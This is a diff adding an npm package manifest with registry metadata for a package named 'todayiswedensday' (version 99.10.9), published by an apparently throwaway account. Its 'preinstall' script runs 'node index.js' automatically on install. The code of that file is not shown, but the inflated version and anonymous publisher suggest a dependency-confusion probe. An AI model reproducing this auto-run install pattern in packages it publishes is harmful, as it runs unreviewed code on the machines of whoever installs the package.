@@ -1,0 +1,45 @@
+{
+    "name": "todayiswedensday",
+    "version": "99.10.9",
+    "description": "orbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "todayiswedensday@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-Ou2OKQKDV0lEU9BfDtEWgpw1KYKeKtEtqoA4bIy0I4KgqDLUQ264dPsZwMjHctC4/ULEsNaR3u89XqmhnOIv+Q==",
+        "shasum": "66c236ab8855ac33aadca5df99e94ccaaf2e823b",
+        "tarball": "https://registry.npmjs.org/todayiswedensday/-/todayiswedensday-99.10.9.tgz",
+        "fileCount": 3,
+        "unpackedSize": 10453,
+        "signatures": [
+            {
+                "keyid": "SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA",
+                "sig": "MEQCIAPc9HyLS9vlC3YVUPA9ACYo0ynho5/7zJd/6PHzE+/5AiAEoK9ZWRE+QTqC0kqS8VDr1BWtYbxc1eoIvpPNnfjQCA=="
+            }
+        ],
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiStz2ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmo2lg/+MzfekwPN9uz42zkCalhGVYRIjNSuf1vamFcNXq0v3JPLC2Wo\r\nOTqErP5enQrZP7Hh3QIJ+53o09i4W2MdPf9j2SzvnmG9/P5vnKIFMMxqKYP1\r\n+PzSkRXsim9i35E9b/lWQfL/S2swkGz9Y2tU2A9R9g2qYSDJzOWrAPIVgQxO\r\nvc0YCvj+GtkX/WD9sRJyL7GT5TriE5DBIjuGeklRhSwT5BMbfSeImB111W7r\r\n86tSVthsHGIzy9B22nkx/4CZjf217VupQ/wsWkHHFPfKkTKn6i8pHOAzRHjz\r\nG5LxSKsK7ls0945EjA4zWBD9WB7h+T0Ttx/RRJqERHZnottlrPkVOeRjp1iC\r\n58XKWiCvXZ1iy1TDDpp0BodqjFbkOxQ+j+cXYA0DdjYFmUa3+ujQ1XPFZ2Hm\r\nlC0Adv0He3Ikf3P66/ojbE04dhhAJZAoHIZd3oWU/PX/wBu1RiSK423fKRu+\r\njlOi6LyAzpY2+RWWSECoG7A+A+RmdAqAOQPyh20/C6LXuyTbTmXtm0Rauz2l\r\nh+dA3YLnpkzzuMvkAYMsPjGNjOtfdIqmnU0bBvU0B1d2qWAN3bOWN7JBd42z\r\n30V7fL1Lbnam9moaUldWoBWI8NnjS2gfUnkZxGJ5NL4s1wW8fPphGkumSfAu\r\nhCiYoiqldSSPFHfCTR/W4BnylrrgszCo+Ro=\r\n=deji\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "f9yxoijj",
+        "email": "f9yxoijj@33mail.ga"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "f9yxoijj",
+            "email": "f9yxoijj@33mail.ga"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/todayiswedensday_99.10.9_1649073398201_0.7972436727899752"
+    },
+    "_hasShrinkwrap": false
+}
